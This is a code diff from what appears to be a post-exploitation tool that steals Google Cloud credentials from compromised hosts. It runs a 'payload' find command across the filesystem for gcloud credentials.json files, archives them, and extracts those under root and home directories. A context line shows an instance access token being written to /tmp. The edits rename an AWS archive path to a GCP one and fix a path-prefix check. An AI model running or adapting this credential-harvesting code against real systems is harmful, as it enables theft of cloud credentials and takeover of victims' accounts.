@@ -160,8 +160,8 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                     session.log(result)
 
                     # remove any pre-existing cred archived
-                    if session.platform.Path('/tmp/aws_creds.tgz').exists():
-                        session.platform.unlink('/tmp/aws_creds.tgz')
+                    if session.platform.Path('/tmp/gcp_creds.tgz').exists():
+                        session.platform.unlink('/tmp/gcp_creds.tgz')
 
                     # enumerate gcp creds
                     payload = 'find / \( -type f -a \( -name \'credentials.json\' -a -path \'*.config/gcloud/credentials.json\' \) \)  -printf \'%P\n\''
@@ -367,7 +367,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                     if Path(f'/tmp/{hostname}_gcp_creds.tgz').exists():
                         file = tarfile.open(f'/tmp/{hostname}_gcp_creds.tgz')
                         for m in file.members:
-                            if m.isfile() and m.path.endswith('/.config/gcloud/credentials.json') and (m.path.startswith('/root') or m.path.startswith('/home')):
+                            if m.isfile() and m.path.endswith('/.config/gcloud/credentials.json') and (m.path.startswith('root') or m.path.startswith('home')):
                                 file.extract(m.path, task_path)
                                 shutil.copy2(Path.joinpath(
                                     task_path, m.path), Path.joinpath(gcp_dir, os.path.basename(m.path)))
